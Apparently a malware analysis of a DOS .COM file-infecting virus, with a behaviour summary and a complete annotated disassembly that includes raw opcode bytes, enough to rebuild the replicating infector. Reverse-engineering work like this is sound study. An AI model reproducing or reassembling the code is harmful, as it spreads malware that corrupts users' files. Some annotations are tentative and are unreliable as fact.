# Notes on the virus

## Quick summary

The virus injects itself to the start of .COM files in the current directory.
It checks for two words near the start of the file to not inject the same file twice.
Infected files run the original code after executing the virus payload.
Infected files also track their "generation" (the original virus is generation 0), and will randomly print a message and terminate instead of executing the orignal code starting at generation 4.

## Virus behavior

1. When an infected .COM file is executed, first it executed the virus payload
2. It increments a "generation" counter at 0x105
    1. The original VIRUS.COM is generation 0
    2. A virus of generation i injects itself as generation i+1 on uninfected files
3. Then it copies itself to an area of memory in the extended section
4. It asks DOS for *.COM files in the current directory
5. For each file found:
    1. It reads the file into the extended section of memory, after the copied virus code
    2. The original file starts at an offest of 0x34f from the start of the virus code (there are 0s between both)
    3. It checks if the file has the words 49 56 at 0x3
    4. If the words are present, the file is considered infected and skipped
    5. Otherwise, the contents of the file are overwritten with the portion of memory that contains the virus payload and the original file contents
6. After the all files are processed, the generation of the current virus is checked
    1. If it's less than 4 (it checks for 5 since it's already been incremented at the start of the payload), it executes the original code
    2. Otherwise it checks the first bit from a autoincreasing counter in memory (not sure what's counting), and if it's 1 print a message trolling the user and terminates the program

## Notes on the disassembled code

This dissassembled code has been extracted with [ndisasm](https://linux.die.net/man/1/ndisasm) to avoid manually copying f

Note: since code is not loaded into memory here, addresses start at 0000.

```
; Start of virus payload
00000000  EB14              jmp short 0x16  ; Jump to main routine
00000002  90                nop

; Virus mark
00000003  49                dec cx
00000004  56                push si

; Generation counter and "*.COM"
00000005  002A              add [bp+si],ch  ; Start of "*.COM", only 2A; the higher half is different between VIRUS.com and infected files
00000007  2E43              cs inc bx
00000009  4F                dec di
0000000A  4D                dec bp
0000000B  004F04            add [bx+0x4],cl ; End of "*.COM", only 00

0000000E  0000              add [bx+si],al
00000010  0100              add [bx+si],ax
00000012  0000              add [bx+si],al
00000014  0000              add [bx+si],al

; Start of main routine
00000016  8CC8              mov ax,cs       ; Store CS (code segment register) into AX
00000018  050010            add ax,0x1000   ; Add 0x1000 to the stored CS in AX
0000001B  8EC0              mov es,ax       ; ES (extra segment) points to 0x16BA
0000001D  FE060501          inc byte [0x105]; Increment byte counter at 0x105 (it's 0x00 in VIRUS.COM, 0x05 in infected files)
00000021  BE0001            mov si,0x100    ; SI is the source index for string operations, and now it points to the start of the code
00000024  31FF              xor di,di       ; Set DI to 0x0000, set ZF flag
00000026  B94F01            mov cx,0x14f
00000029  F3A4              rep movsb       ; Copy 0x14F (CX) bytes from 0x100 (DS:SI), i.e. whole virus code, to 0x16BA:0100 (ES:DI, start of extra segment)
                                            ; Note that 0x105 will be different in the copy due to inc instruction, which marks that the actual contents of the file must be executed, i.e. it's not the origianl VIRUS.COM file
0000002B  BA5F02            mov dx,0x25f
0000002E  B41A              mov ah,0x1a
00000030  CD21              int 0x21        ; Set DTA to 0x25f (contains garbage)
00000032  BA0601            mov dx,0x106    ; Points to *.COM
00000035  B91600            mov cx,0x16     ; File attrs: hidden, system, subdir?
00000038  B44E              mov ah,0x4e
0000003A  CD21              int 0x21        ; Find first matching file, name, attrs, etc stored in DTA
0000003C  7260              jc 0x9e         ; Jump to 0x9e if error?

; Inject virus into file routine
0000003E  BA7D02            mov dx,0x27d    ; File name in DTA
00000041  B8023D            mov ax,0x3d02
00000044  CD21              int 0x21        ; Open file r/w, put file handle in AX
00000046  A31401            mov [0x114],ax  ; Copy file handle to DS:114, don't know why yet
00000049  89C3              mov bx,ax       ; Copy file handle to BX
0000004B  06                push es
0000004C  1F                pop ds          ; Set DS to ES (0x16BA)
0000004D  BA4F03            mov dx,0x34f    ; Pointer to read buffer
00000050  B9FFFF            mov cx,0xffff   ; Read up to FFFF bytes
00000053  B43F              mov ah,0x3f
00000055  CD21              int 0x21        ; Read from file, store # bytes read in AX
00000057  054F03            add ax,0x34f    ; This is going to be the new size of the infected file, size payload + padding puts start of old program at 34f
0000005A  2EA31201          mov [cs:0x112],ax   ; Move # bytes read + 34f to CS:112 (couple of words before file handle)
0000005E  3E813E52034956    cmp word [ds:0x352],0x5649  ; Check if file is already infected by checking string 0x4956 near start of file
00000065  7421              jz 0x88         ; If file already infected
00000067  31C9              xor cx,cx       ; Set CX to 0x0000
00000069  89CA              mov dx,cx       ; Set DX to 0x0000
0000006B  2E8B1E1401        mov bx,[cs:0x114]   ; Move file handle to BX
00000070  B80042            mov ax,0x4200
00000073  CD21              int 0x21        ; Move file pointer to start of file
00000075  7211              jc 0x88         ; Jump to 0x88 if error
00000077  BA0000            mov dx,0x0
0000007A  2E8B0E1201        mov cx,[cs:0x112]   ; Move # bytes read + 34f, i.e. original file + payload to CX
0000007F  2E8B1E1401        mov bx,[cs:0x114]   ; Move file handle to BX
00000084  B440              mov ah,0x40
00000086  CD21              int 0x21        ; Write to file
00000088  2E8B1E1401        mov bx,[cs:0x114]   ; Move file handle to BX
0000008D  B43E              mov ah,0x3e
0000008F  CD21              int 0x21        ; Close file
00000091  0E                push cs
00000092  1F                pop ds          ; Set DS to CS (0x6BA)
00000093  B44F              mov ah,0x4f
00000095  BA5F02            mov dx,0x25f
00000098  CD21              int 0x21        ; Find next matching file
0000009A  7202              jc 0x9e         ; Jump to 0x9e if error (AX was set to 12 = no more files)
0000009C  EBA0              jmp short 0x3e  ; Jump to 0x3e (Inject virus into file routine)

; No more files
0000009E  BA8000            mov dx,0x80
000000A1  B41A              mov ah,0x1a
000000A3  CD21              int 0x21        ; Set DTA
000000A5  803E050105        cmp byte [0x105],0x5
000000AA  725B              jc 0x107        ; Jump to 0x107 (endgame routine) if less than 5th virus generation
000000AC  B84000            mov ax,0x40
000000AF  8ED8              mov ds,ax
000000B1  A16C00            mov ax,[0x6c]   ; Read some sort of autoincrement counter (?), just to get a random value
000000B4  0E                push cs
000000B5  1F                pop ds
000000B6  83E001            and ax,byte +0x1    ; Check first bit of randome
000000B9  744C              jz 0x107        ; If it was zero, go to endgame routine
000000BB  BAC401            mov dx,0x1c4    ; Points to "Si quieres..."
000000BE  B409              mov ah,0x9
000000C0  CD21              int 0x21        ; Print string
000000C2  CD20              int 0x20        ; End program

; "Si quieres el titulo de experto... desinfectame xDDDDDDD"
000000C4  53                push bx        ; Start of "Si quieres..."
000000C5  69207175          imul sp,[bx+si],word 0x7571
000000C9  6965726573        imul sp,[di+0x72],word 0x7365
000000CE  20656C            and [di+0x6c],ah
000000D1  207469            and [si+0x69],dh
000000D4  7475              jz 0x14b
000000D6  6C                insb
000000D7  6F                outsw
000000D8  206465            and [si+0x65],ah
000000DB  206578            and [di+0x78],ah
000000DE  7065              jo 0x145
000000E0  7274              jc 0x156
000000E2  6F                outsw
000000E3  2E2E2E206465      and [cs:si+0x65],ah
000000E9  7369              jnc 0x154
000000EB  6E                outsb
000000EC  6665637461        o32 arpl [gs:si+0x61],si
000000F1  6D                insw
000000F2  65207844          and [gs:bx+si+0x44],bh
000000F6  44                inc sp
000000F7  44                inc sp
000000F8  44                inc sp
000000F9  44                inc sp
000000FA  44                inc sp
000000FB  44                inc sp
000000FC  44                inc sp
000000FD  2001              and [bx+di],al
000000FF  2020              and [bx+si],ah
00000101  2020              and [bx+si],ah
00000103  200A              and [bp+si],cl  ; End of "Si quieres..."

; The following has been aligned to 0x107
; Endgame routine
00000107  BE2402            mov si,0x224
0000010A  B92B00            mov cx,0x2b
0000010D  31FF              xor di,di       ; Set DI to 0x0000
0000010F  F3A4              rep movsb       ; Copy 0x2b (CX) bytes from 0x224 (DS:SI), to 0x16BA:0000 (ES:DI, start of extra segment, with virus code)
                                            ; Up until start of main routine? That's not what I see, maybe it's CX words, not bytes?
00000111  31FF              xor di,di       ; Set DI to 0x0000
00000113  2EC7060E010000    mov word [cs:0x10e],0x0 ; 
0000011A  2E8C061001        mov [cs:0x110],es       ;
0000011F  2EFF2E0E01        jmp far [cs:0x10e]      ; Jump to code in extra segment (16BA:0000)? Which actually is the next instruction
00000124  1E                push ds
00000125  07                pop es
00000126  BE4F04            mov si,0x44f
00000129  803E050101        cmp byte [0x105],0x1    ; Check if mark is 1 (it is for first generation infected files but not for VIRUS.COM?)
0000012E  7504              jnz 0x134               ; If mark not 1 (original VIRUS.COM?) skip the next instruction 
00000130  81EE0002          sub si,0x200            ; Only if mark not 1 (original VIRUS.COM?)
00000134  BF0001            mov di,0x100
00000137  B9FFFF            mov cx,0xffff
0000013A  29F1              sub cx,si
0000013C  F3A4              rep movsb       ; Copy 0xfbb0 or 0xfeb0 (CX) bytes from 0x224 (DS:SI) to 0x16BA:0000 (ES:DI, start of extra segment)
0000013E  2EC70600010001    mov word [cs:0x100],0x100
00000145  2E8C1E0201        mov [cs:0x102],ds
0000014A  2EFF2E0001        jmp far [cs:0x100]
```
